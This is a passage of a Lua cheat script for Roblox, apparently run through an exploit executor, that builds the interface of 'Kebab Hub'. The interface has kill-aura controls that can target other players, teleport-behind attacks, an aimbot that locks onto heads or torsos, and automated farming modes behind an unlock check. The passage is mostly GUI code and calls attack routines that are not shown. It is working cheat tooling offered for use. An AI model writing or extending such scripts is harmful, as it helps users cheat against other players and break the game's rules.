        if tick() - authorizationMemory.authorizationTime < authorizationMemory.timeout then ExtremeMode.authorized = true return true end
        authorizationMemory.extremeModeAuthorized = false
    end
    ExtremeMode.authorized = false ExtremeMode.enabled = false return false
end

local function authorizeExtremeMode(authType, permanent, timeout)
    authorizationMemory.extremeModeAuthorized = true
    authorizationMemory.authorizationTime = tick()
    authorizationMemory.authType = authType
    authorizationMemory.permanent = permanent
    authorizationMemory.timeout = timeout or 0
    ExtremeMode.authorized = true
    getgenv().ExtremeModeAuth = {authorized=true, authTime=tick(), authType=authType, permanent=permanent, timeout=timeout}
    return true
end

local function updateGUIFromKeybinds()
    if state.guiButtons.kaToggleBtn then
        state.guiButtons.kaToggleBtn.BackgroundColor3 = config.killaura.enabled and Color3.fromRGB(80, 150, 80) or Color3.fromRGB(200, 50, 50)
        state.guiButtons.kaToggleBtn.Text = config.killaura.enabled and "DISABLE KILL AURA" or "ENABLE KILL AURA"
    end
    if state.guiButtons.abToggleBtn then
        state.guiButtons.abToggleBtn.BackgroundColor3 = config.aimbot.enabled and Color3.fromRGB(80, 150, 80) or Color3.fromRGB(200, 50, 50)
        state.guiButtons.abToggleBtn.Text = config.aimbot.enabled and "DISABLE AIMBOT" or "ENABLE AIMBOT"
    end
end

local kaStatusLabel, abStatusLabel, extremeBtn, extremeStatus, disabledOverlay, updateExtremeModeDisplay

local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "KebabHub"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999999
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 600, 0, 650)
    mainFrame.Position = UDim2.new(0.5, -300, 0.1, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(18, 10, 25)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 24)

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 25, 60)), ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 15, 35))})
    gradient.Rotation = 90
    gradient.Parent = mainFrame

    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 90)
    titleBar.BackgroundColor3 = Color3.fromRGB(25, 15, 35)
    titleBar.BackgroundTransparency = 0.2
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 24)

    local logoContainer = Instance.new("Frame")
    logoContainer.Size = UDim2.new(0, 70, 0, 70)
    logoContainer.Position = UDim2.new(0, 10, 0.5, -35)
    logoContainer.BackgroundColor3 = Color3.fromRGB(35, 20, 45)
    logoContainer.BackgroundTransparency = 0.3
    logoContainer.BorderSizePixel = 0
    logoContainer.Parent = titleBar
    Instance.new("UICorner", logoContainer).CornerRadius = UDim.new(0, 35)

    local logo = Instance.new("ImageLabel")
    logo.Size = UDim2.new(1, -10, 1, -10)
    logo.Position = UDim2.new(0, 5, 0, 5)
    logo.BackgroundTransparency = 1
    logo.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=125892041364815&width=150&height=150&format=png"
    logo.Parent = logoContainer
    Instance.new("UICorner", logo).CornerRadius = UDim.new(0, 35)

    local fallbackText = Instance.new("TextLabel")
    fallbackText.Size = UDim2.new(1, 0, 1, 0)
    fallbackText.BackgroundTransparency = 1
    fallbackText.Text = "🍢"
    fallbackText.TextColor3 = Color3.fromRGB(255, 255, 255)
    fallbackText.Font = Enum.Font.GothamBold
    fallbackText.TextSize = 35
    fallbackText.Visible = false
    fallbackText.Parent = logoContainer

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 250, 1, 0)
    title.Position = UDim2.new(0, 95, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "🍢 KEBAB HUB"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 28
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar

    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(0, 200, 0, 20)
    subtitle.Position = UDim2.new(0, 95, 0, 60)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "The power of doner"
    subtitle.TextColor3 = Color3.fromRGB(180, 150, 200)
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 12
    subtitle.TextXAlignment = Enum.TextXAlignment.Left
    subtitle.Parent = titleBar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 45, 0, 45)
    closeBtn.Position = UDim2.new(1, -60, 0.5, -22.5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(45, 30, 55)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 150, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 22
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = titleBar
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 14)

    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        config.killaura.enabled = false
        config.aimbot.enabled = false
        ExtremeMode.enabled = false
        if state.highlightObject then state.highlightObject:Destroy() state.highlightObject = nil end
    end)

    local dragging, dragStart, startPos = false, nil, nil
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true dragStart = input.Position startPos = mainFrame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    local tabContainer = Instance.new("Frame")
    tabContainer.Size = UDim2.new(1, -40, 0, 55)
    tabContainer.Position = UDim2.new(0, 20, 0, 100)
    tabContainer.BackgroundColor3 = Color3.fromRGB(30, 20, 40)
    tabContainer.BackgroundTransparency = 0.3
    tabContainer.BorderSizePixel = 0
    tabContainer.Parent = mainFrame
    Instance.new("UICorner", tabContainer).CornerRadius = UDim.new(0, 18)

    local killauraTab = Instance.new("TextButton")
    killauraTab.Size = UDim2.new(0.34, -3, 1, -10)
    killauraTab.Position = UDim2.new(0, 5, 0, 5)
    killauraTab.BackgroundColor3 = Color3.fromRGB(150, 100, 220)
    killauraTab.Text = "⚔️ KILL AURA"
    killauraTab.TextColor3 = Color3.fromRGB(255, 255, 255)
    killauraTab.Font = Enum.Font.GothamBold
    killauraTab.TextSize = 14
    killauraTab.BorderSizePixel = 0
    killauraTab.AutoButtonColor = false
    killauraTab.Parent = tabContainer
    Instance.new("UICorner", killauraTab).CornerRadius = UDim.new(0, 14)

    local aimbotTab = Instance.new("TextButton")
    aimbotTab.Size = UDim2.new(0.33, -3, 1, -10)
    aimbotTab.Position = UDim2.new(0.34, 5, 0, 5)
    aimbotTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55)
    aimbotTab.Text = "🎯 AIMBOT"
    aimbotTab.TextColor3 = Color3.fromRGB(180, 150, 200)
    aimbotTab.Font = Enum.Font.GothamBold
    aimbotTab.TextSize = 14
    aimbotTab.BorderSizePixel = 0
    aimbotTab.AutoButtonColor = false
    aimbotTab.Parent = tabContainer
    Instance.new("UICorner", aimbotTab).CornerRadius = UDim.new(0, 14)

    local miscTab = Instance.new("TextButton")
    miscTab.Size = UDim2.new(0.33, -3, 1, -10)
    miscTab.Position = UDim2.new(0.67, 5, 0, 5)
    miscTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55)
    miscTab.Text = "🔧 MISC"
    miscTab.TextColor3 = Color3.fromRGB(180, 150, 200)
    miscTab.Font = Enum.Font.GothamBold
    miscTab.TextSize = 14
    miscTab.BorderSizePixel = 0
    miscTab.AutoButtonColor = false
    miscTab.Parent = tabContainer
    Instance.new("UICorner", miscTab).CornerRadius = UDim.new(0, 14)

    local function makeScrollFrame()
        local f = Instance.new("ScrollingFrame")
        f.Size = UDim2.new(1, -40, 1, -185)
        f.Position = UDim2.new(0, 20, 0, 165)
        f.BackgroundTransparency = 1
        f.BorderSizePixel = 0
        f.ScrollBarThickness = 6
        f.ScrollBarImageColor3 = Color3.fromRGB(150, 100, 255)
        f.CanvasSize = UDim2.new(0, 0, 0, 0)
        f.AutomaticCanvasSize = Enum.AutomaticSize.Y
        f.Visible = false
        f.Parent = mainFrame
        return f
    end

    local killauraContent = makeScrollFrame() killauraContent.Visible = true
    local aimbotContent = makeScrollFrame()
    local miscContent = makeScrollFrame()

    killauraTab.MouseButton1Click:Connect(function()
        killauraTab.BackgroundColor3 = Color3.fromRGB(150, 100, 220) aimbotTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55) miscTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55)
        killauraTab.TextColor3 = Color3.fromRGB(255,255,255) aimbotTab.TextColor3 = Color3.fromRGB(180,150,200) miscTab.TextColor3 = Color3.fromRGB(180,150,200)
        killauraContent.Visible = true aimbotContent.Visible = false miscContent.Visible = false
    end)
    aimbotTab.MouseButton1Click:Connect(function()
        aimbotTab.BackgroundColor3 = Color3.fromRGB(150, 100, 220) killauraTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55) miscTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55)
        aimbotTab.TextColor3 = Color3.fromRGB(255,255,255) killauraTab.TextColor3 = Color3.fromRGB(180,150,200) miscTab.TextColor3 = Color3.fromRGB(180,150,200)
        aimbotContent.Visible = true killauraContent.Visible = false miscContent.Visible = false
    end)
    miscTab.MouseButton1Click:Connect(function()
        miscTab.BackgroundColor3 = Color3.fromRGB(150, 100, 220) killauraTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55) aimbotTab.BackgroundColor3 = Color3.fromRGB(45, 30, 55)
        miscTab.TextColor3 = Color3.fromRGB(255,255,255) killauraTab.TextColor3 = Color3.fromRGB(180,150,200) aimbotTab.TextColor3 = Color3.fromRGB(180,150,200)
        miscContent.Visible = true killauraContent.Visible = false aimbotContent.Visible = false
    end)

    local function createCard(parent, cardTitle, yPos, height)
        height = height or 85
        local card = Instance.new("Frame")
        card.Size = UDim2.new(1, 0, 0, height)
        card.Position = UDim2.new(0, 0, 0, yPos)
        card.BackgroundColor3 = Color3.fromRGB(30, 20, 40)
        card.BackgroundTransparency = 0.3
        card.BorderSizePixel = 0
        card.Parent = parent
        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 18)
        local accent = Instance.new("Frame")
        accent.Size = UDim2.new(0, 4, 1, -20)
        accent.Position = UDim2.new(0, 10, 0.5, -10)
        accent.BackgroundColor3 = Color3.fromRGB(180, 120, 255)
        accent.BorderSizePixel = 0
        accent.Parent = card
        Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 2)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, -30, 0, 30)
        lbl.Position = UDim2.new(0, 25, 0, 5)
        lbl.BackgroundTransparency = 1
        lbl.Text = cardTitle
        lbl.TextColor3 = Color3.fromRGB(200, 180, 255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 15
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = card
        return card
    end

    local function makeSlider(parent, yPos, defaultVal, minVal, maxVal, fmt, onChange)
        local slider = Instance.new("TextButton")
        slider.Size = UDim2.new(1, -40, 0, 8)
        slider.Position = UDim2.new(0, 20, 0, yPos)
        slider.BackgroundColor3 = Color3.fromRGB(45, 30, 55)
        slider.Text = ""
        slider.BorderSizePixel = 0
        slider.Parent = parent
        Instance.new("UICorner", slider).CornerRadius = UDim.new(0, 4)
        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 20, 0, 26)
        knob.Position = UDim2.new((defaultVal - minVal)/(maxVal - minVal), -10, 0.5, -13)
        knob.BackgroundColor3 = Color3.fromRGB(150, 100, 255)
        knob.BorderSizePixel = 0
        knob.Parent = slider
        Instance.new("UICorner", knob).CornerRadius = UDim.new(0, 8)
        local draggingSlider = false
        slider.MouseButton1Down:Connect(function() draggingSlider = true end)
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then draggingSlider = false end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if draggingSlider and input.UserInputType == Enum.UserInputType.MouseMovement then
                local mousePos = UserInputService:GetMouseLocation()
                local sliderPos = slider.AbsolutePosition
                local sliderSize = slider.AbsoluteSize
                local rel = math.clamp((mousePos.X - sliderPos.X) / sliderSize.X, 0, 1)
                local val = minVal + rel * (maxVal - minVal)
                knob.Position = UDim2.new(rel, -10, 0.5, -13)
                onChange(val, rel)
            end
        end)
        return slider, knob
    end

    local yPos = 0
    local mainCard = createCard(killauraContent, "MAIN CONTROLS", yPos)
    yPos = yPos + 95
    local kaToggleBtn = Instance.new("TextButton")
    kaToggleBtn.Size = UDim2.new(1, -30, 0, 45)
    kaToggleBtn.Position = UDim2.new(0, 20, 0, 30)
    kaToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    kaToggleBtn.Text = "ENABLE KILL AURA"
    kaToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    kaToggleBtn.Font = Enum.Font.GothamBold
    kaToggleBtn.TextSize = 14
    kaToggleBtn.BorderSizePixel = 0
    kaToggleBtn.Parent = mainCard
    Instance.new("UICorner", kaToggleBtn).CornerRadius = UDim.new(0, 12)
    kaToggleBtn.MouseButton1Click:Connect(function()
        config.killaura.enabled = not config.killaura.enabled
        state.cachedTargets = {} state.attackSuccessCount = 0 state.attackFailCount = 0
        kaToggleBtn.BackgroundColor3 = config.killaura.enabled and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
        kaToggleBtn.Text = config.killaura.enabled and "DISABLE KILL AURA" or "ENABLE KILL AURA"
        if config.killaura.enabled then cacheFolders() end
    end)
    state.guiButtons.kaToggleBtn = kaToggleBtn

    local methodCard = createCard(killauraContent, "ATTACK METHOD", yPos)
    yPos = yPos + 95
    local methodGrid = Instance.new("Frame")
    methodGrid.Size = UDim2.new(1, -40, 0, 40)
    methodGrid.Position = UDim2.new(0, 20, 0, 35)
    methodGrid.BackgroundTransparency = 1
    methodGrid.Parent = methodCard
    local methodNames = {"Auto","M1","M2","M3","M4"}
    local methodValues = {"auto","method1","method2","method3","method4"}
    local methodBtns = {}
    for i = 1, 5 do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.18, 0, 1, 0)
        btn.Position = UDim2.new((i-1)*0.2+0.02, 0, 0, 0)
        btn.BackgroundColor3 = i==1 and Color3.fromRGB(150,100,220) or Color3.fromRGB(45,30,55)
        btn.Text = methodNames[i] btn.TextColor3 = Color3.fromRGB(255,255,255)
        btn.Font = Enum.Font.GothamBold btn.TextSize = 12 btn.BorderSizePixel = 0
        btn.Parent = methodGrid
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        methodBtns[i] = btn
        btn.MouseButton1Click:Connect(function()
            config.killaura.attackMethod = methodValues[i]
            for j=1,5 do methodBtns[j].BackgroundColor3 = j==i and Color3.fromRGB(150,100,220) or Color3.fromRGB(45,30,55) end
        end)
    end

    local m4Card = createCard(killauraContent, "METHOD 4 OPTIONS", yPos)
    yPos = yPos + 95
    local m4TeleportToggle = Instance.new("TextButton")
    m4TeleportToggle.Size = UDim2.new(1, -30, 0, 40)
    m4TeleportToggle.Position = UDim2.new(0, 20, 0, 30)
    m4TeleportToggle.BackgroundColor3 = Color3.fromRGB(80, 150, 80)
    m4TeleportToggle.Text = "TELEPORT BEHIND: ON"
    m4TeleportToggle.TextColor3 = Color3.fromRGB(255,255,255)
    m4TeleportToggle.Font = Enum.Font.GothamBold m4TeleportToggle.TextSize = 13 m4TeleportToggle.BorderSizePixel = 0
    m4TeleportToggle.Parent = m4Card
    Instance.new("UICorner", m4TeleportToggle).CornerRadius = UDim.new(0, 10)
    m4TeleportToggle.MouseButton1Click:Connect(function()
        config.killaura.method4TeleportBehind = not config.killaura.method4TeleportBehind
        m4TeleportToggle.BackgroundColor3 = config.killaura.method4TeleportBehind and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
        m4TeleportToggle.Text = "TELEPORT BEHIND: " .. (config.killaura.method4TeleportBehind and "ON" or "OFF")
    end)

    local rangeCard = createCard(killauraContent, "RANGE", yPos, 95)
    yPos = yPos + 105
    local rangeLabel = Instance.new("TextLabel")
    rangeLabel.Size = UDim2.new(1,-30,0,25) rangeLabel.Position = UDim2.new(0,20,0,30)
    rangeLabel.BackgroundTransparency=1 rangeLabel.Text=config.killaura.range.." studs"
    rangeLabel.TextColor3=Color3.fromRGB(255,255,255) rangeLabel.Font=Enum.Font.GothamBold rangeLabel.TextSize=14
    rangeLabel.TextXAlignment=Enum.TextXAlignment.Center rangeLabel.Parent=rangeCard
    makeSlider(rangeCard, 62, config.killaura.range, 5, 50, "%d", function(val) config.killaura.range = math.floor(val) rangeLabel.Text = config.killaura.range .. " studs" end)

    local delayCard = createCard(killauraContent, "ATTACK DELAY", yPos, 95)
    yPos = yPos + 105
    local delayLabel = Instance.new("TextLabel")
    delayLabel.Size = UDim2.new(1,-30,0,25) delayLabel.Position = UDim2.new(0,20,0,30)
    delayLabel.BackgroundTransparency=1 delayLabel.Text=config.killaura.attackDelay.."s"
    delayLabel.TextColor3=Color3.fromRGB(255,255,255) delayLabel.Font=Enum.Font.GothamBold delayLabel.TextSize=14
    delayLabel.TextXAlignment=Enum.TextXAlignment.Center delayLabel.Parent=delayCard
    makeSlider(delayCard, 62, config.killaura.attackDelay, 0.05, 0.5, "%.2f", function(val) config.killaura.attackDelay = math.round(val*100)/100 delayLabel.Text = config.killaura.attackDelay .. "s" end)

    local targetCard = createCard(killauraContent, "TARGETS", yPos)
    yPos = yPos + 95
    local kaNpcToggle = Instance.new("TextButton")
    kaNpcToggle.Size=UDim2.new(0.45,-5,0,40) kaNpcToggle.Position=UDim2.new(0,20,0,30)
    kaNpcToggle.BackgroundColor3=Color3.fromRGB(80,150,80) kaNpcToggle.Text="NPCS: ON"
    kaNpcToggle.TextColor3=Color3.fromRGB(255,255,255) kaNpcToggle.Font=Enum.Font.GothamBold kaNpcToggle.TextSize=13 kaNpcToggle.BorderSizePixel=0
    kaNpcToggle.Parent=targetCard Instance.new("UICorner",kaNpcToggle).CornerRadius=UDim.new(0,10)
    local kaPlayerToggle = Instance.new("TextButton")
    kaPlayerToggle.Size=UDim2.new(0.45,-5,0,40) kaPlayerToggle.Position=UDim2.new(0.55,0,0,30)
    kaPlayerToggle.BackgroundColor3=Color3.fromRGB(200,50,50) kaPlayerToggle.Text="PLAYERS: OFF"
    kaPlayerToggle.TextColor3=Color3.fromRGB(255,255,255) kaPlayerToggle.Font=Enum.Font.GothamBold kaPlayerToggle.TextSize=13 kaPlayerToggle.BorderSizePixel=0
    kaPlayerToggle.Parent=targetCard Instance.new("UICorner",kaPlayerToggle).CornerRadius=UDim.new(0,10)
    kaNpcToggle.MouseButton1Click:Connect(function()
        config.killaura.targetNPCs = not config.killaura.targetNPCs state.cachedTargets={}
        kaNpcToggle.BackgroundColor3=config.killaura.targetNPCs and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
        kaNpcToggle.Text="NPCS: "..(config.killaura.targetNPCs and "ON" or "OFF")
    end)
    kaPlayerToggle.MouseButton1Click:Connect(function()
        config.killaura.targetPlayers = not config.killaura.targetPlayers state.cachedTargets={}
        kaPlayerToggle.BackgroundColor3=config.killaura.targetPlayers and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
        kaPlayerToggle.Text="PLAYERS: "..(config.killaura.targetPlayers and "ON" or "OFF")
    end)

    local statusCard = createCard(killauraContent, "STATUS", yPos, 95)
    yPos = yPos + 105
    local kaStatusLbl = Instance.new("TextLabel")
    kaStatusLbl.Size=UDim2.new(1,-30,0,50) kaStatusLbl.Position=UDim2.new(0,20,0,30)
    kaStatusLbl.BackgroundColor3=Color3.fromRGB(25,15,30) kaStatusLbl.BackgroundTransparency=0.5
    kaStatusLbl.Text="Status: Disabled\nTargets: 0 | Success: 0 | Fail: 0"
    kaStatusLbl.TextColor3=Color3.fromRGB(200,180,255) kaStatusLbl.Font=Enum.Font.Gotham kaStatusLbl.TextSize=12
    kaStatusLbl.BorderSizePixel=0 kaStatusLbl.Parent=statusCard
    Instance.new("UICorner",kaStatusLbl).CornerRadius=UDim.new(0,10)

        local extremeCard = Instance.new("Frame")
    extremeCard.Size=UDim2.new(1,0,0,160) extremeCard.Position=UDim2.new(0,0,0,yPos)
    extremeCard.BackgroundColor3=Color3.fromRGB(40,20,50) extremeCard.BackgroundTransparency=0.2
    extremeCard.BorderSizePixel=2 extremeCard.BorderColor3=Color3.fromRGB(200,100,255)
    extremeCard.Parent=killauraContent
    Instance.new("UICorner",extremeCard).CornerRadius=UDim.new(0,18)
    yPos = yPos + 170

    local extremeTitle = Instance.new("TextLabel")
    extremeTitle.Size=UDim2.new(1,-20,0,30) extremeTitle.Position=UDim2.new(0,10,0,5)
    extremeTitle.BackgroundTransparency=1 extremeTitle.Text="⚡ EXTREME MODE"
    extremeTitle.TextColor3=Color3.fromRGB(220,150,255) extremeTitle.Font=Enum.Font.GothamBold extremeTitle.TextSize=16
    extremeTitle.TextXAlignment=Enum.TextXAlignment.Left extremeTitle.Parent=extremeCard

    local extremeBtnFrame = Instance.new("Frame")
    extremeBtnFrame.Size=UDim2.new(1,-20,0,50) extremeBtnFrame.Position=UDim2.new(0,10,0,30)
    extremeBtnFrame.BackgroundColor3=Color3.fromRGB(60,40,70) extremeBtnFrame.BorderSizePixel=0 extremeBtnFrame.Parent=extremeCard
    Instance.new("UICorner",extremeBtnFrame).CornerRadius=UDim.new(0,12)

    local extremeBtnInner = Instance.new("TextButton")
    extremeBtnInner.Name="ExtremeBtn" extremeBtnInner.Size=UDim2.new(1,0,1,0)
    extremeBtnInner.BackgroundColor3=Color3.fromRGB(200,50,50) extremeBtnInner.Text="TFE FARM"
    extremeBtnInner.TextColor3=Color3.fromRGB(255,255,255) extremeBtnInner.Font=Enum.Font.GothamBold extremeBtnInner.TextSize=14 extremeBtnInner.BorderSizePixel=0
    extremeBtnInner.Parent=extremeBtnFrame
    Instance.new("UICorner",extremeBtnInner).CornerRadius=UDim.new(0,12)

    local scourgeBtnFrame = Instance.new("Frame")
    scourgeBtnFrame.Size=UDim2.new(1,-20,0,50) scourgeBtnFrame.Position=UDim2.new(0,10,0,85)
    scourgeBtnFrame.BackgroundColor3=Color3.fromRGB(60,40,70) scourgeBtnFrame.BorderSizePixel=0 scourgeBtnFrame.Parent=extremeCard
    Instance.new("UICorner",scourgeBtnFrame).CornerRadius=UDim.new(0,12)

    local scourgeToggleBtn = Instance.new("TextButton")
    scourgeToggleBtn.Size=UDim2.new(1,0,1,0)
    scourgeToggleBtn.BackgroundColor3=Color3.fromRGB(200,50,50) scourgeToggleBtn.Text="SCOURGE FARM"
    scourgeToggleBtn.TextColor3=Color3.fromRGB(255,255,255) scourgeToggleBtn.Font=Enum.Font.GothamBold scourgeToggleBtn.TextSize=14 scourgeToggleBtn.BorderSizePixel=0
    scourgeToggleBtn.Parent=scourgeBtnFrame
    Instance.new("UICorner",scourgeToggleBtn).CornerRadius=UDim.new(0,12)

    local disabledOverlayInner = Instance.new("Frame")
    disabledOverlayInner.Size=UDim2.new(1,0,1,0) disabledOverlayInner.BackgroundColor3=Color3.fromRGB(0,0,0)
    disabledOverlayInner.BackgroundTransparency=0.5 disabledOverlayInner.BorderSizePixel=0 disabledOverlayInner.ZIndex=10 disabledOverlayInner.Visible=false
    disabledOverlayInner.Parent=extremeBtnFrame
    local disabledText = Instance.new("TextLabel")
    disabledText.Size=UDim2.new(1,0,1,0) disabledText.BackgroundTransparency=1 disabledText.Text="🔒 LOCKED"
    disabledText.TextColor3=Color3.fromRGB(255,255,255) disabledText.Font=Enum.Font.GothamBold disabledText.TextSize=14 disabledText.ZIndex=11
    disabledText.Parent=disabledOverlayInner

    extremeBtnInner.MouseButton1Click:Connect(function()
        if not ExtremeMode.authorized then return end
        ExtremeMode.enabled = not ExtremeMode.enabled
        if ExtremeMode.enabled then
            extremeBtnInner.BackgroundColor3=Color3.fromRGB(80,150,80) extremeBtnInner.Text="TFE FARM ACTIVE"
            startExtremeAutoClicker()
        else
            extremeBtnInner.BackgroundColor3=Color3.fromRGB(200,50,50) extremeBtnInner.Text="TFE FARM"
        end
    end)

    scourgeToggleBtn.MouseButton1Click:Connect(function()
        config.scourgeFarm.enabled = not config.scourgeFarm.enabled
        if config.scourgeFarm.enabled then
            scourgeToggleBtn.BackgroundColor3=Color3.fromRGB(80,150,80)
            scourgeToggleBtn.Text="SCOURGE FARM ACTIVE"
        else
            scourgeToggleBtn.BackgroundColor3=Color3.fromRGB(200,50,50)
            scourgeToggleBtn.Text="SCOURGE FARM"
        end
        toggleScourgeFarm(config.scourgeFarm.enabled)
    end)

    local abYPos = 0
    local abMainCard = createCard(aimbotContent, "MAIN CONTROLS", abYPos)
    abYPos = abYPos + 95
    local abToggleBtn = Instance.new("TextButton")
    abToggleBtn.Size=UDim2.new(1,-30,0,45) abToggleBtn.Position=UDim2.new(0,20,0,30)
    abToggleBtn.BackgroundColor3=Color3.fromRGB(200,50,50) abToggleBtn.Text="ENABLE AIMBOT"
    abToggleBtn.TextColor3=Color3.fromRGB(255,255,255) abToggleBtn.Font=Enum.Font.GothamBold abToggleBtn.TextSize=14 abToggleBtn.BorderSizePixel=0
    abToggleBtn.Parent=abMainCard Instance.new("UICorner",abToggleBtn).CornerRadius=UDim.new(0,12)
    abToggleBtn.MouseButton1Click:Connect(function()
        config.aimbot.enabled = not config.aimbot.enabled
        abToggleBtn.BackgroundColor3=config.aimbot.enabled and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
        abToggleBtn.Text=config.aimbot.enabled and "DISABLE AIMBOT" or "ENABLE AIMBOT"
        if config.aimbot.enabled then createFovCircle()
        else state.currentAimbotTarget=nil if state.highlightObject then state.highlightObject:Destroy() state.highlightObject=nil end end
    end)
    state.guiButtons.abToggleBtn = abToggleBtn

    local lockCard = createCard(aimbotContent, "LOCK PART", abYPos)
    abYPos = abYPos + 95
    local headLockBtn = Instance.new("TextButton")
    headLockBtn.Size=UDim2.new(0.45,-5,0,40) headLockBtn.Position=UDim2.new(0,20,0,30)
    headLockBtn.BackgroundColor3=Color3.fromRGB(150,100,220) headLockBtn.Text="HEAD"
    headLockBtn.TextColor3=Color3.fromRGB(255,255,255) headLockBtn.Font=Enum.Font.GothamBold headLockBtn.TextSize=13 headLockBtn.BorderSizePixel=0
    headLockBtn.Parent=lockCard Instance.new("UICorner",headLockBtn).CornerRadius=UDim.new(0,10)
    local torsoLockBtn = Instance.new("TextButton")
    torsoLockBtn.Size=UDim2.new(0.45,-5,0,40) torsoLockBtn.Position=UDim2.new(0.55,0,0,30)
    torsoLockBtn.BackgroundColor3=Color3.fromRGB(45,30,55) torsoLockBtn.Text="TORSO"
    torsoLockBtn.TextColor3=Color3.fromRGB(255,255,255) torsoLockBtn.Font=Enum.Font.GothamBold torsoLockBtn.TextSize=13 torsoLockBtn.BorderSizePixel=0
    torsoLockBtn.Parent=lockCard Instance.new("UICorner",torsoLockBtn).CornerRadius=UDim.new(0,10)
    headLockBtn.MouseButton1Click:Connect(function() config.aimbot.lockPart="Head" headLockBtn.BackgroundColor3=Color3.fromRGB(150,100,220) torsoLockBtn.BackgroundColor3=Color3.fromRGB(45,30,55) end)
    torsoLockBtn.MouseButton1Click:Connect(function() config.aimbot.lockPart="Torso" torsoLockBtn.BackgroundColor3=Color3.fromRGB(150,100,220) headLockBtn.BackgroundColor3=Color3.fromRGB(45,30,55) end)

    local fovCard = createCard(aimbotContent, "FOV CIRCLE", abYPos, 120)
    abYPos = abYPos + 130
    local fovToggle = Instance.new("TextButton")
    fovToggle.Size=UDim2.new(0.45,-5,0,35) fovToggle.Position=UDim2.new(0,20,0,30)
    fovToggle.BackgroundColor3=config.aimbot.fov.enabled and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
    fovToggle.Text="FOV: "..(config.aimbot.fov.enabled and "ON" or "OFF")
    fovToggle.TextColor3=Color3.fromRGB(255,255,255) fovToggle.Font=Enum.Font.GothamBold fovToggle.TextSize=12 fovToggle.BorderSizePixel=0
    fovToggle.Parent=fovCard Instance.new("UICorner",fovToggle).CornerRadius=UDim.new(0,8)
    local fovVisibleToggle = Instance.new("TextButton")
    fovVisibleToggle.Size=UDim2.new(0.45,-5,0,35) fovVisibleToggle.Position=UDim2.new(0.55,0,0,30)
    fovVisibleToggle.BackgroundColor3=config.aimbot.fov.visible and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
    fovVisibleToggle.Text="VISIBLE: "..(config.aimbot.fov.visible and "ON" or "OFF")
    fovVisibleToggle.TextColor3=Color3.fromRGB(255,255,255) fovVisibleToggle.Font=Enum.Font.GothamBold fovVisibleToggle.TextSize=12 fovVisibleToggle.BorderSizePixel=0
    fovVisibleToggle.Parent=fovCard Instance.new("UICorner",fovVisibleToggle).CornerRadius=UDim.new(0,8)
    local fovRadiusLabel = Instance.new("TextLabel")
    fovRadiusLabel.Size=UDim2.new(1,-30,0,20) fovRadiusLabel.Position=UDim2.new(0,20,0,70)
